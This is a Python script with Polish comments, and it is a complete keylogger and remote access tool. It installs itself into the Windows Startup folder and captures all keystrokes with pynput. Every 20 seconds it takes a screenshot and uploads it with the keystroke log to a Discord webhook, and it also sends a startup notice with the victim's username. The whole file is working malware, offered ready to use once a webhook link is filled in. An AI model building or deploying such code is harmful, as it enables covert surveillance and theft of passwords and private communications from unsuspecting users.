import pyautogui
import requests
import time
import os
import threading
import sys
import shutil
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
from pynput import keyboard

# Konfiguracja
DISCORD_WEBHOOK_URL = "your webhook link"
INTERVAL = 20
IDLE_THRESHOLD = 4

keystrokes = ""
last_press_time = time.time()
lock = threading.Lock()
running = True

EXIT_KEYS = {keyboard.Key.page_up, keyboard.Key.page_down}
current_keys = set()

def add_to_startup():
    """Kopiuje plik do folderu Autostart, jeśli jeszcze go tam nie ma."""
    try:
        app_path = sys.executable
        app_name = os.path.basename(app_path)
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', app_name)
        
        if not os.path.exists(startup_path):
            shutil.copy2(app_path, startup_path)
            return True
    except:
        pass
    return False

def send_init_message(installed):
    try:
        user = os.getlogin()
        status = "zainstalowano w Autostart" if installed else "już obecny/uruchomiony"
        payload = {"content": f"🚀 **Program aktywny!**\nUżytkownik: `{user}`\nStatus: `{status}`"}
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except:
        pass

def show_exit_message():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    messagebox.showinfo("Status", "szczur wylaczony")
    root.destroy()

def on_press(key):
    global keystrokes, last_press_time, current_keys, running
    if key in EXIT_KEYS:
        current_keys.add(key)
        if all(k in current_keys for k in EXIT_KEYS):
            running = False
            return False
    current_time = time.time()
    with lock:
        if current_time - last_press_time > IDLE_THRESHOLD and keystrokes != "":
            if not keystrokes.endswith("\n"):
                keystrokes += "\n"
        try:
            keystrokes += key.char
        except AttributeError:
            if key == keyboard.Key.space: keystrokes += " "
            elif key == keyboard.Key.enter: keystrokes += "\n"
            elif key == keyboard.Key.backspace:
                if len(keystrokes) > 0 and keystrokes[-1] != "\n":
                    keystrokes = keystrokes[:-1]
        last_press_time = current_time

def on_release(key):
    if key in current_keys:
        current_keys.remove(key)

def send_data():
    global keystrokes
    screenshot_name = "screenshot.png"
    log_name = "logs.txt"
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_name)
        with lock:
            current_logs = keystrokes
            keystrokes = "" 
        with open(log_name, "w", encoding="utf-8") as f:
            f.write(current_logs if current_logs else "Brak aktywności.")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = {"content": f"📊 **Raport:** `{timestamp}`"}
        with open(screenshot_name, "rb") as ss, open(log_name, "rb") as lg:
            files = {"file1": (screenshot_name, ss, "image/png"), "file2": (log_name, lg, "text/plain")}
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
    except:
        pass
    finally:
        if os.path.exists(screenshot_name): os.remove(screenshot_name)
        if os.path.exists(log_name): os.remove(log_name)

def main():
    # Próba dodania do autostartu
    installed = add_to_startup()
    send_init_message(installed)
    
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    while running:
        for _ in range(INTERVAL):
            if not running: break
            time.sleep(1)
        if running:
            send_data()
            
    show_exit_message()
    sys.exit()

if __name__ == "__main__":

    main()
